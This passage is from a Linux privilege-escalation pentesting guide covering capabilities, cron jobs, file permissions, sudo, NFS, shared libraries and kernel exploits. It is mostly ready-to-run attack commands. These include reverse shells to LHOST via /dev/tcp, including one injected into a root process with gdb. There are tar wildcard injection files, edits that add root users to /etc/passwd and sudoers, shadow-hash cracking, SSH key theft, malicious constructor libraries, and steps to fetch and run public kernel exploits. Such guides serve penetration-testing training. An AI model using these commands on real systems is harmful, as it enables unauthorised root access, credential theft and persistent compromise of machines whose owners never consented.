### 12.3.3 cap_sys_admin

Nearly root-equivalent:

```bash
# Can mount filesystems, change hostname, load modules, etc.

# Mount /etc as writable and modify it:
python3 -c "
import ctypes

libc = ctypes.cdll.LoadLibrary('libc.so.6')
# Remount / as writable:
libc.mount(None, b'/', None, 131072, None)  # MS_REMOUNT
"

# More practically — use nsenter:
nsenter -t 1 -m -u -i -n -p /bin/bash   # Enter host namespaces!
```

### 12.3.4 cap_sys_ptrace

Can trace (read/write memory of) ANY process:

```bash
# Inject code into a running root process!

# Find a process running as root:
ps aux | grep root

# Use gdb to inject shell code:
gdb -p ROOT_PID
# Inside gdb:
call (void)system("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")
```

### 12.3.5 cap_net_raw

Can create raw sockets — useful for network attacks but not direct privesc.

### 12.3.6 Removing Capabilities (Cleanup)

```bash
# If you get root, remove capabilities from binaries (cleanup after setting back):
setcap -r /usr/bin/python3  # Remove all capabilities
```

---

# Chapter 13: Writable Files & Cron Job Exploitation

## 13.1 Cron Job Exploitation Theory

Cron jobs are scheduled tasks. If root runs a cron job, and we can modify it or its dependencies, we get root execution.

**Attack surfaces:**
1. The cron script itself is writable
2. A library/script the cron job imports is writable
3. The cron job uses PATH-relative commands
4. The cron job uses wildcards (wildcard injection)

## 13.2 Identifying Cron Jobs

```bash
# System cron files:
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User cron jobs:
crontab -l              # Your cron jobs
crontab -l -u root      # Root's (usually fails)

# Find cron-executed scripts by watching:
# Use pspy — it watches process creation:
./pspy64 -i 100 2>/dev/null | grep -i cron
```

## 13.3 Writable Cron Script Exploitation

```bash
# Scenario: /etc/cron.d/backup contains:
# * * * * * root /opt/backup.sh

# Check if script is writable:
ls -la /opt/backup.sh
# -rw-r--rw- 1 root root ... /opt/backup.sh  ← world-writable!

# Append reverse shell to it:
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /opt/backup.sh

# Wait up to 1 minute for cron to execute it:
nc -lvnp LPORT
# → Root shell!
```

## 13.4 Writable Script Directory

```bash
# If /opt/ or /var/scripts/ is world-writable:
ls -la /opt/           # Check directory permissions

# Cron runs /opt/cleanup.sh  (not writable itself)
# But /opt/ directory is writable → we can REPLACE the file!

cp /opt/cleanup.sh /tmp/cleanup.sh.bak   # Backup
cat > /opt/cleanup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
EOF
chmod +x /opt/cleanup.sh
```

## 13.5 Wildcard Injection

Wildcard injection exploits cron jobs that use shell wildcards (*, ?) in unsafe ways.

### 13.5.1 tar Wildcard Injection

```bash
# Vulnerable cron job:
# * * * * * root cd /var/backups && tar czf backup.tgz *
#                                                       ^ WILDCARD!

# tar interprets filenames starting with - as flags!
# We can create files named like tar flags!

cd /var/backups    # Go to the backup directory

# Create checkpoint file and action:
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' > /var/backups/shell.sh
chmod +x /var/backups/shell.sh

# Create files that look like tar arguments:
touch '/var/backups/--checkpoint=1'
touch '/var/backups/--checkpoint-action=exec=sh shell.sh'

# Now when tar runs: tar czf backup.tgz *
# * expands to: --checkpoint=1  --checkpoint-action=exec=sh shell.sh  file1  file2...
# tar interprets these as flags → executes shell.sh as ROOT!

# Wait for cron, listen:
nc -lvnp LPORT
```

### 13.5.2 rsync Wildcard Injection

```bash
# Vulnerable: rsync -a * destination/
touch '/tmp/dir/-e sh shell.sh'
echo '#!/bin/bash\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1' > /tmp/dir/shell.sh
chmod +x /tmp/dir/shell.sh
```

## 13.6 Cron PATH Injection

```bash
# /etc/crontab with PATH set:
# PATH=/home/alice:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# * * * * * root antivirus.sh

# /home/alice is first in PATH! We're alice!
# Create malicious antivirus.sh in our home:
cat > /home/alice/antivirus.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /home/alice/antivirus.sh

# Wait for cron, then:
/tmp/rootbash -p
```

---

# Chapter 14: Weak File Permissions

## 14.1 Writable /etc/passwd

If /etc/passwd is writable, you can add a root-level user directly.

```bash
# Check if writable:
ls -la /etc/passwd
# -rw-rw-rw- 1 root root ... /etc/passwd  ← world-writable!

# Method 1: Add user with UID 0, no password
echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd
su hacker   # Empty password!

# Method 2: Add user with known password hash
# Generate hash: openssl passwd -1 "password"
# -1 = MD5 hash (or use -6 for SHA-512)
openssl passwd -1 "mypassword"
# Output: $1$abc$hashvalue...

echo 'hacker:$1$abc$hashvalue...:0:0:hacker:/root:/bin/bash' >> /etc/passwd
su hacker   # Password: mypassword

# Method 3: Replace root's x with hash (direct root access)
sed -i 's/^root:x/root:$1$abc$hashvalue.../' /etc/passwd
su root   # Password: mypassword
```

## 14.2 Readable /etc/shadow

```bash
# Check if readable:
cat /etc/shadow
# If readable, extract hashes for offline cracking:

cat /etc/shadow | grep -v '!' | grep -v '*' | awk -F: '$2 != "" {print $1":"$2}'
# Output: root:$6$salt$longhash...

# Crack with hashcat:
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt
# -m 1800 = sha512crypt ($6$)

# Crack with john:
john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt
john --show shadow_hashes.txt

# Hash modes for hashcat:
# $1$ = MD5         → mode 500
# $2a$ = bcrypt     → mode 3200
# $5$ = SHA-256     → mode 7400
# $6$ = SHA-512     → mode 1800
```

## 14.3 Writable /etc/sudoers

```bash
# Check writable:
ls -la /etc/sudoers
ls -la /etc/sudoers.d/

# If writable — add yourself:
echo 'alice ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo bash   # Instant root!

# Or add via sudoers.d (if directory is writable):
echo 'alice ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/alice
chmod 440 /etc/sudoers.d/alice
sudo bash
```

## 14.4 Readable SSH Private Keys

```bash
# Find SSH private keys:
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -type f 2>/dev/null
find /home -name ".ssh" -type d 2>/dev/null

# Check root's SSH directory:
ls -la /root/.ssh/
cat /root/.ssh/id_rsa          # If readable — copy to attacker machine!

# Use the key:
# On attacker machine:
chmod 600 stolen_key
ssh -i stolen_key root@TARGET_IP
```

---

# PART V — SUDO EXPLOITATION

---

# Chapter 15: Sudo Misconfigurations

## 15.1 Understanding Sudo

Sudo (superuser do) lets users run commands as other users (typically root) based on rules in `/etc/sudoers`.

```bash
# Check your sudo permissions:
sudo -l      # What can current user run?
sudo -ll     # Verbose output

# Common sudo -l output format:
# User alice may run the following commands on TARGET:
#     (root) /usr/bin/vim           ← can run vim as root
#     (root) NOPASSWD: /usr/bin/find ← can run find as root, NO password needed!
#     (ALL) ALL                      ← can run ANYTHING as ANY user!
#     (root) /usr/bin/python3 /opt/script.py ← specific script only
```

## 15.2 Sudoers File Syntax

```
# Format: who where=(as_whom) what
alice   ALL=(root)     /usr/bin/vim          # With password
alice   ALL=(root)     NOPASSWD:/usr/bin/vim # Without password
alice   ALL=(ALL:ALL)  ALL                   # Full sudo
%sudo   ALL=(ALL:ALL)  ALL                   # Group sudo (% = group)

# DANGEROUS patterns:
alice ALL=(ALL) NOPASSWD: ALL        # Full root without password!
alice ALL=(root) NOPASSWD: /bin/bash # Direct bash as root!
alice ALL=(root) /usr/bin/vim        # vim = shell escape!

# !command means "not this command" — can sometimes be bypassed:
alice ALL=(root) !/bin/bash          # Think this prevents bash? Wrong!
```

## 15.3 Sudo Exploitation by Binary

For any binary in `sudo -l`, check GTFOBins for `sudo` filter.

### 15.3.1 sudo bash / sh

```bash
# If: (root) NOPASSWD: /bin/bash
sudo bash       # Instant root!
sudo /bin/bash
sudo bash -p
```

### 15.3.2 sudo vim

```bash
# If: (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'    # Shell escape
sudo vim -c ':shell'         # Shell via vim

# Also:
sudo vim /etc/sudoers        # Directly edit sudoers!
# Add: alice ALL=(ALL) NOPASSWD: ALL
```

### 15.3.3 sudo find

```bash
# If: (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/bash \; -quit
sudo find / -name anything -exec bash -p \;
sudo find / -maxdepth 1 -exec /bin/sh \;
```

### 15.3.4 sudo less / more

```bash
# If: (root) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
# In less, press: !bash  or  !sh

# If: (root) NOPASSWD: /usr/bin/more
sudo more /etc/passwd
# In more, press: !bash
```

### 15.3.5 sudo python / python3

```bash
# If: (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 15.3.6 sudo perl

```bash
sudo perl -e 'exec "/bin/bash";'
sudo perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

### 15.3.7 sudo awk

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 15.3.8 sudo nmap

```bash
# Old nmap:
sudo nmap --interactive
# !bash

# New nmap:
echo 'os.execute("/bin/bash")' > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse 127.0.0.1
```

### 15.3.9 sudo env

```bash
# If: (root) NOPASSWD: /usr/bin/env
sudo env /bin/bash
```

### 15.3.10 sudo tee

```bash
# tee reads stdin and writes to file (as root!)
# Perfect for writing to root-only files:

# Add root user to /etc/passwd:
echo 'hacker::0:0:hacker:/root:/bin/bash' | sudo tee -a /etc/passwd
su hacker   # No password → root!

# Add yourself to sudoers:
echo 'alice ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers
```

### 15.3.11 sudo cp

```bash
# Copy malicious file to system location:
echo 'alice ALL=(ALL) NOPASSWD: ALL' > /tmp/sudoers
sudo cp /tmp/sudoers /etc/sudoers
sudo bash   # Now works!

# Or create SUID bash:
cp /bin/bash /tmp/bash
sudo cp /tmp/bash /usr/bin/bash
sudo chmod +s /usr/bin/bash
/usr/bin/bash -p   # Root!
```

### 15.3.12 sudo cat

```bash
# Can read root-only files:
sudo cat /etc/shadow    # Get password hashes!
sudo cat /root/.ssh/id_rsa   # Get root's private key!
sudo cat /root/root.txt  # CTF flag!
```

### 15.3.13 sudo wget / curl

```bash
# Overwrite system files by downloading our version:
# Attacker: python3 -m http.server 8000
# Victim:
sudo wget http://LHOST:8000/malicious_crontab -O /etc/cron.d/malicious
sudo curl http://LHOST:8000/malicious_sudoers -o /etc/sudoers
```

### 15.3.14 sudo tar

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### 15.3.15 sudo zip

```bash
# zip -TT flag executes a program for testing:
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'bash #'
```

### 15.3.16 Specific Script Sudo

```bash
# If: (root) NOPASSWD: /usr/bin/python3 /opt/script.py
# Can you edit /opt/script.py?
ls -la /opt/script.py        # Check permissions
echo 'import os; os.system("/bin/bash")' >> /opt/script.py
sudo /usr/bin/python3 /opt/script.py   # Root!

# Can the script import user-controlled modules?
# Check script content:
cat /opt/script.py
# If it does: import something_we_can_provide → PYTHONPATH attack!
```

## 15.4 The ! Bypass (CVE-2019-14287)

```bash
# sudoers entry:
# alice ALL=(ALL,!root) /bin/bash
# Meaning: can run bash as any user EXCEPT root

# CVE-2019-14287 bypass:
sudo -u#-1 /bin/bash     # -1 UID is interpreted as 0xFFFFFFFF → wraps to root!
sudo -u#4294967295 /bin/bash   # Same, explicit 32-bit overflow

# Check sudo version (vulnerable < 1.8.28):
sudo --version
```

## 15.5 sudo -l Without Password Prompt

Sometimes `sudo -l` requires a password. Bypass strategies:

```bash
# sudo -l may work without password if configured
sudo -l 2>/dev/null

# If password required, check sudoers directly:
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# Or search for sudo config in unusual places:
find / -name sudoers 2>/dev/null
```

---

# Chapter 16: Sudo Version Vulnerabilities

## 16.1 Baron Samedit (CVE-2021-3156)

Heap buffer overflow in sudo 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1. Allows any local user (no sudo privileges needed) to get root.

```bash
# Check sudo version:
sudo --version | head -1
# If: Sudo version 1.8.x (x<=31) or 1.9.0-1.9.5 → likely vulnerable!

# Quick check:
sudoedit -s '\' `python3 -c 'print("A"*65536)'` 2>/dev/null
# If you get: "malloc(): memory corruption" → vulnerable!
# If you get: "usage: ..." → NOT vulnerable

# Exploit:
# Download from: https://github.com/blasty/CVE-2021-3156
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich    # Lists targets
./sudo-hax-me-a-sandwich 0  # Try target 0 (Ubuntu 20.04 sudo 1.8.31)
```

## 16.2 Sudo < 1.8.28 User ID -1 Bypass (CVE-2019-14287)

Already covered in 15.4.

## 16.3 Checking Sudo Version

```bash
sudo --version
dpkg -l sudo                 # Debian/Ubuntu
rpm -qa | grep sudo          # Red Hat/CentOS
```

---

# PART VI — KERNEL & OS EXPLOITATION

---

# Chapter 17: Sudoers File — Deep Dive

## 17.1 The Sudoers File Structure

The `/etc/sudoers` file is the heart of sudo's permission model. Understanding every field is critical for both exploiting and understanding misconfigurations.

```bash
# NEVER edit /etc/sudoers directly — always use:
visudo            # Validates syntax before saving
# A syntax error in sudoers can LOCK YOU OUT of sudo entirely!

# Sudoers file location:
/etc/sudoers
/etc/sudoers.d/    # Drop-in directory — any file here is included
```

### 17.1.1 Complete Syntax Reference

```
# Format: WHO  WHERE = (AS_WHOM) WHAT

alice ALL=(ALL:ALL) ALL       # Full root access (most dangerous)
# alice → username (or %groupname for groups)
# ALL  → on ALL hosts
# (ALL:ALL) → run as any user:any group
# ALL  → run any command

# NOPASSWD — no password prompt:
alice ALL=(ALL) NOPASSWD: ALL
alice ALL=(root) NOPASSWD: /bin/vim

# Specific commands only:
alice ALL=(root) /usr/bin/systemctl restart nginx
alice ALL=(root) /usr/bin/systemctl * nginx      # Wildcard — dangerous!

# Multiple commands:
alice ALL=(root) /bin/kill, /bin/killall, /usr/bin/pkill

# Group-based (% prefix = group):
%sudo   ALL=(ALL:ALL) ALL
%docker ALL=(root) /usr/bin/docker
%admin  ALL=(ALL) NOPASSWD: ALL

# Aliases:
User_Alias    WEBADMINS = alice, bob, charlie
Cmnd_Alias    WEBCOMMANDS = /usr/sbin/apache2ctl, /bin/systemctl restart nginx
WEBADMINS ALL = (root) WEBCOMMANDS

# Defaults — configure sudo behavior:
Defaults env_reset                    # Reset environment (secure)
Defaults env_keep += "LD_PRELOAD"     # DANGEROUS — enables LD_PRELOAD attack!
Defaults env_keep += "PYTHONPATH"     # DANGEROUS — Python module injection!
Defaults secure_path=...              # Fixed PATH for sudo commands
Defaults requiretty                   # Must have TTY
Defaults !requiretty                  # Explicitly disable TTY requirement
Defaults timestamp_timeout=15         # Password caches for 15 minutes
Defaults log_input, log_output        # Full I/O logging
```

### 17.1.2 Identifying Exploitable Patterns

```bash
# Look for in sudo -l output:

# 1. NOPASSWD on anything useful:
(root) NOPASSWD: /usr/bin/find    → instant root via -exec

# 2. Wildcard arguments:
(root) /bin/cat /var/log/*        → sudo cat /var/log/../../../etc/shadow
(root) /usr/bin/vim /var/www/html/* → may edit arbitrary files

# 3. env_keep with dangerous variables:
Defaults env_keep += "LD_PRELOAD"    → LD_PRELOAD attack!
Defaults env_keep += "PYTHONPATH"    → Python module injection!

# 4. Commands that run other commands (GTFOBins):
(root) /usr/bin/vi, /usr/bin/vim, /usr/bin/nano  → :!/bin/bash
(root) /usr/bin/less, /usr/bin/more, /usr/bin/man → !/bin/bash
(root) /usr/bin/find → -exec /bin/bash \;
(root) /usr/bin/awk, /usr/bin/python*, /usr/bin/perl → instant shell

# 5. Custom scripts you can modify:
(root) /opt/backup.sh     → can you edit /opt/backup.sh?
(root) /home/alice/admin.py → your own home directory!

# 6. Dangerous defaults:
!env_reset  → your environment carries through to sudo!
```

## 17.2 env_reset and secure_path Interaction

```bash
# Defaults env_reset (DEFAULT — always active unless disabled):
# → Your environment is CLEARED before sudo runs
# → Only variables in env_keep are preserved
# → Prevents PATH hijacking and LD_PRELOAD against sudo

# If env_reset is DISABLED:
Defaults !env_reset
# → Your full environment carries through to sudo
# → PATH hijacking works against any sudo command!
# → LD_PRELOAD works if the binary doesn't clear it!

# secure_path overrides your PATH completely:
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
# Even with PATH hijacked, sudo uses this fixed path

# Check:
sudo -l | grep "env_reset\|secure_path\|env_keep"
```

## 17.3 Sudo Timestamp & Token Abuse

```bash
# Sudo caches authentication (default: 15 minutes)
# If you catch someone using sudo → their token is valid!

# Check cached tokens:
ls -la /run/sudo/ts/ 2>/dev/null
ls -la /var/run/sudo/ts/ 2>/dev/null

# If you can read another user's token file, you can copy it:
# (Requires ability to read /run/sudo/ts/USERNAME)

# Extend your own sudo cache (useful during exploitation):
sudo -v    # Validates/refreshes sudo timestamp without running a command

# Check if sudo auth is currently cached (no password needed):
sudo -n true 2>/dev/null && echo "SUDO CACHED!" || echo "Need password"
# -n = non-interactive

# Sudo logfile analysis (if you have access):
cat /var/log/sudo.log 2>/dev/null
grep "sudo" /var/log/auth.log | tail -20
# Look for: what commands were recently run as root, which users have used sudo
```

---

# Chapter 19: NFS Exploitation

## 19.1 What is NFS and Why Does It Matter?

NFS (Network File System) allows a server to share directories over the network. The critical misconfiguration is `no_root_squash`.

**Root Squashing explained:**

```
Default behavior (root_squash ON — SAFE):
  Client's root user (UID 0)  →  maps to  →  nobody (UID 65534) on server
  → Client root has NO special power on NFS files

With no_root_squash (DANGEROUS):
  Client's root user (UID 0)  →  maps to  →  root (UID 0) on server!
  → Client root can create SUID files!
  → Target executes them as root!
  → PRIVILEGE ESCALATION!
```

**Why is this devastating?**

When you mount an NFS share with `no_root_squash` and you are root on your **attacker machine**, you can:
1. Create a SUID binary on the share (owned by root with SUID set)
2. The TARGET machine sees this file as SUID root
3. Any user on the TARGET who runs it gets root!

## 19.2 Finding NFS Shares

```bash
# From ATTACKER machine (before getting shell):
nmap -p 111,2049 TARGET_IP
nmap --script=nfs-showmount,nfs-ls TARGET_IP
showmount -e TARGET_IP         # Lists all NFS exports
rpcinfo -p TARGET_IP           # RPC services (NFS uses RPC)

# From TARGET machine (after getting shell):
cat /etc/exports               # NFS export config
showmount -e localhost
cat /proc/mounts | grep nfs    # Currently mounted NFS shares
mount | grep nfs

# Reading /etc/exports — know every option:
# rw            = Read-Write
# ro            = Read-Only
# no_root_squash= Don't squash root → DANGEROUS!
# root_squash   = Default safe behavior
# all_squash    = Squash ALL users to anonymous
# insecure      = Allow connections from ports > 1024
# sync          = Synchronous writes
# async         = Async (faster but riskier)
# no_subtree_check = Skip export subtree check
```

## 19.3 NFS Privilege Escalation — Full Walkthrough

```bash
# =====================================================
# PREREQUISITE: You must be ROOT on your ATTACKER machine
# Target must export a share with no_root_squash
# =====================================================

# Step 1: Identify the vulnerable export
showmount -e TARGET_IP
# Output:
# /tmp *(rw,sync,no_root_squash,no_subtree_check)
#       ^     ^   ^^^^^^^^^^^^^^^^
#     all  writable   KEY FLAG — vulnerable!

# Step 2: Mount it (as root on attacker)
sudo mkdir -p /mnt/nfs
sudo mount -t nfs TARGET_IP:/tmp /mnt/nfs -o nolock
# -o nolock = don't use locking daemon (helps with some NFS setups)
# Verify:
ls /mnt/nfs    # You should see contents of TARGET's /tmp!

# Step 3: Create SUID bash
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod +xs /mnt/nfs/rootbash      # +x = executable, +s = SUID
sudo chown root:root /mnt/nfs/rootbash

# Verify:
ls -la /mnt/nfs/rootbash
# -rwsr-xr-x 1 root root ... rootbash
#    ^--- 's' = SUID! Owned by root!

# Step 4: On the TARGET machine
ls -la /tmp/rootbash         # Shows SUID root binary!
/tmp/rootbash -p             # -p = privileged mode (don't drop SUID)
id
# uid=1000(alice) gid=1000(alice) euid=0(root)  ← EUID = root!

# =====================================================
# ALTERNATIVE: Create a C setuid wrapper (more explicit)
# =====================================================

cat > /tmp/wrapper.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setresuid(0,0,0);   // Set real, effective, saved UID to 0 (root)
    setresgid(0,0,0);
    system("/bin/bash");
    return 0;
}
EOF

gcc -o /mnt/nfs/wrapper /tmp/wrapper.c
sudo chown root:root /mnt/nfs/wrapper
sudo chmod +s /mnt/nfs/wrapper

# On target:
/tmp/wrapper   # Drops into root bash!

# =====================================================
# ALTERNATIVE: Write SSH key to root's .ssh
# =====================================================
# If /root is exported with no_root_squash:
sudo mkdir -p /mnt/nfs/.ssh
ssh-keygen -t ed25519 -f /tmp/nfs_key -N ""
sudo cp /tmp/nfs_key.pub /mnt/nfs/.ssh/authorized_keys
sudo chmod 700 /mnt/nfs/.ssh
sudo chmod 600 /mnt/nfs/.ssh/authorized_keys
sudo chown -R root:root /mnt/nfs/.ssh

ssh -i /tmp/nfs_key root@TARGET_IP    # Direct root SSH!

# Unmount when done:
sudo umount /mnt/nfs
```

## 19.4 NFS as Information Source

```bash
# Even without no_root_squash, NFS shares reveal information:
# Mount the share:
sudo mount -t nfs TARGET_IP:/exported/path /mnt/nfs

# Look for:
ls -la /mnt/nfs/
cat /mnt/nfs/.bash_history          # User history!
cat /mnt/nfs/id_rsa                 # SSH keys!
grep -r "password" /mnt/nfs/ 2>/dev/null  # Credentials!
find /mnt/nfs -name "*.conf" 2>/dev/null  # Config files
find /mnt/nfs -name "*.bak" 2>/dev/null   # Backup files
```

---

# Chapter 20: Shared Libraries & Dynamic Linker

## 20.1 How the Dynamic Linker Works

Every time a binary runs, `ld-linux.so` (the dynamic linker) loads all required shared libraries before `main()` executes. The search order is:

```
1. LD_PRELOAD (highest priority, but IGNORED for SUID binaries)
2. LD_LIBRARY_PATH (ignored for SUID binaries)
3. RPATH embedded in the binary (set at compile time with gcc -Wl,-rpath)
4. /etc/ld.so.cache (binary index built from /etc/ld.so.conf)
5. Default paths: /lib, /usr/lib, /lib64, /usr/lib64
```

**For privilege escalation:** We need our malicious library in the search path BEFORE the legitimate one, AND the binary must execute with elevated privileges.

```bash
# Debugging the dynamic linker (information gathering):
LD_DEBUG=libs /usr/local/bin/target 2>&1 | head -30    # Show library search
LD_DEBUG=symbols /usr/local/bin/target 2>&1 | head -30 # Symbol resolution
LD_DEBUG=all /usr/local/bin/target 2>&1 | head -50     # Everything

# These LD_DEBUG options ARE honored even for SUID binaries in some older systems!
```

## 20.2 Finding Vulnerable Binaries

```bash
# Find SUID binaries with missing or writable library paths:
find / -perm -4000 -type f 2>/dev/null | while read bin; do
    echo "=== $bin ==="
    ldd "$bin" 2>/dev/null | grep "not found"
done

# Any "not found" = you can provide that library!

# Check RPATH of binary:
readelf -d /usr/local/bin/target 2>/dev/null | grep -E "RPATH|RUNPATH"
objdump -x /usr/local/bin/target 2>/dev/null | grep -i "rpath\|runpath"

# If RPATH = /opt/lib and /opt/lib is world-writable → RPATH hijack!
ls -la /opt/lib/ 2>/dev/null

# Check what functions are imported (undefined = from library):
nm -D /usr/local/bin/target 2>/dev/null | grep "U "
# U custom_init  ← We must provide this function name!
```

## 20.3 RPATH Hijacking Exploitation

```bash
# Scenario:
# SUID binary RPATH = /development/lib/  (world-writable)
# Binary needs function: custom_init() from libcustom.so

# Step 1: Create malicious library with the expected function:
cat > /development/lib/hack.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Must match the function name the binary expects!
void custom_init() {
    printf("[*] Library loaded as UID: %d\n", getuid());
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    exit(0);
}

// Constructor — runs on library load even if function never called:
__attribute__((constructor))
void _load() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# Step 2: Compile as shared library with matching name:
gcc -fPIC -shared -nostartfiles -o /development/lib/libcustom.so /development/lib/hack.c

# Step 3: Run SUID binary — it loads YOUR library first!
/usr/local/bin/target_binary
# → _load() runs at library load time → root bash!
```

## 20.4 Missing Library Attack

```bash
# If ldd shows: libcustom.so => not found
# The binary will fail trying to load it — but we can provide it!

# The linker searches default paths: /lib, /usr/lib, etc.
# If we can write to /usr/lib (unlikely) OR...
# If /etc/ld.so.conf.d/ is writable OR a writable dir is in the search path:

# Check ld.so.conf.d permissions:
ls -la /etc/ld.so.conf.d/

# If writable:
echo "/tmp" > /etc/ld.so.conf.d/evil.conf
ldconfig    # Rebuild cache (needs root — but maybe cron runs this?)

# Or find a writable path already in the search:
ldconfig -v 2>/dev/null | grep -v "^/" | head -20   # Currently cached paths
cat /etc/ld.so.conf
cat /etc/ld.so.conf.d/*

# Create library in writable cached path:
gcc -fPIC -shared -nostartfiles -o /writable/path/libcustom.so malicious.c

# Run target — finds your library!
/usr/local/bin/target
```

## 20.5 strace and ltrace Analysis

```bash
# strace — trace every system call:
strace /usr/local/bin/target 2>&1 | grep -E "open|access|stat" | head -30
# Look for: openat(... "libcustom.so"...) = -1 ENOENT  ← library NOT found
# The path it's trying tells you where to put your library!

# ltrace — trace library function calls:
ltrace /usr/local/bin/target 2>&1 | head -30
# Shows: printf("hello"), strcmp("input", "password"), etc.
# Can reveal: hardcoded passwords, function names, logic!

# Combining strace to see exec calls:
strace -e execve /usr/local/bin/target 2>&1
# If binary calls execve("ls", ...) without full path → PATH hijack!
# If binary calls execve("/bin/sh", ["-c", "service restart"], ...) → check the command
```

---

# Chapter 18: Kernel Exploits

## 18.1 When to Use Kernel Exploits

Kernel exploits should be a **last resort** — they can crash the system! Use them when:
- No SUID misconfigurations
- No sudo vectors
- No writable sensitive files
- No credentials anywhere
- Other methods exhausted

## 18.2 Finding Kernel Version

```bash
uname -a
uname -r
cat /proc/version
cat /etc/os-release
```

## 18.3 Finding Applicable Exploits

```bash
# Method 1: linux-exploit-suggester
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh --uname "$(uname -a)"

# Method 2: searchsploit
searchsploit linux kernel privilege escalation
searchsploit "linux kernel 4.4"
searchsploit "ubuntu 16.04 kernel"

# Method 3: Manual research
# Google: "kernel VERSION privilege escalation"
# e.g.: "kernel 4.4.0-116 privilege escalation"
```

## 18.4 Dirty COW (CVE-2016-5195)

The most famous Linux kernel exploit. Affects kernels 2.6.22 - 4.8.3 (released 2007-2016!).

**Theory:** Race condition in the copy-on-write (COW) mechanism of memory-mapped files allows writing to read-only memory.

```bash
# Check vulnerable:
uname -r
# Kernel < 4.8.3 on unpatched system = vulnerable

# Exploit variants:
# 1. Dirty COW - overwrites /etc/passwd
git clone https://github.com/dirtycow/dirtycow.github.io
# Most useful PoC: dirtyc0w.c

# 2. cowroot - creates SUID root file
# cowroot.c
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
gcc -pthread -o dirty dirty.c -lcrypt
./dirty <new_root_password>
# → Creates temporary root passwd entry
su firefart    # Password you chose
# → ROOT!

# 3. PTRACE variant
# Modifies /proc/self/mem to write to read-only pages
```

**dirty.c explained:**

```c
// dirty.c (simplified explanation)
// 1. mmap() /etc/passwd in read-only mode
// 2. Open /proc/self/mem
// 3. Race condition: two threads
//    Thread 1: madvise(MADV_DONTNEED) — tells kernel: free this memory
//    Thread 2: write to /proc/self/mem — write to the file
// 4. The race causes the write to land in the REAL file (not the copy)
// 5. Result: /etc/passwd is overwritten with our root user!
```

## 18.5 PwnKit (CVE-2021-4034)

Memory corruption in pkexec (polkit). Every Linux distro was vulnerable!

```bash
# Check if pkexec is installed:
which pkexec
pkexec --version

# Exploit:
# https://github.com/berdav/CVE-2021-4034
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034   # → Root shell!
```

## 18.6 DirtyPipe (CVE-2022-0847)

Kernel 5.8 to 5.16.11 / 5.15.25 / 5.10.102. Overwrites arbitrary files (read-only).

```bash
# Check kernel version (5.8 <= version < 5.16.11):
uname -r

# Exploit:
# https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits

# Compile exploit 1 (modifies /etc/passwd):
gcc exploit-1.c -o exploit-1
./exploit-1   # → Root shell!

# Exploit 2 (modifies SUID binary in memory to spawn root shell):
gcc exploit-2.c -o exploit-2
./exploit-2 /usr/bin/sudo   # → Root!
```

## 18.7 Transferring Kernel Exploits to Target

```bash
# Method 1: Python HTTP server (attacker) + wget/curl (victim)
# Attacker:
python3 -m http.server 8000
# Victim:
wget http://LHOST:8000/exploit -O /tmp/exploit
chmod +x /tmp/exploit

# Method 2: Compile on target (if gcc available)
# Upload .c source, compile there:
gcc -o /tmp/exploit /tmp/exploit.c
# Better: compile locally for same arch, upload binary

# Method 3: netcat transfer
# Attacker (receiver):
nc -lvnp 9999 > exploit
# Victim (sender):
nc LHOST 9999 < exploit   

# Or reverse (attacker sends file):
# Attacker: nc -lvnp 9999 < exploit_binary
# Victim: nc LHOST 9999 > /tmp/exploit

# Method 4: base64 encode and decode
# Attacker:
base64 exploit > exploit.b64
# Victim:
echo "BASE64_STRING_HERE" | base64 -d > /tmp/exploit
chmod +x /tmp/exploit
```

---

# PART VII — SERVICE & NETWORK EXPLOITATION

---

# Chapter 21: SSH — Full Pentesting Guide

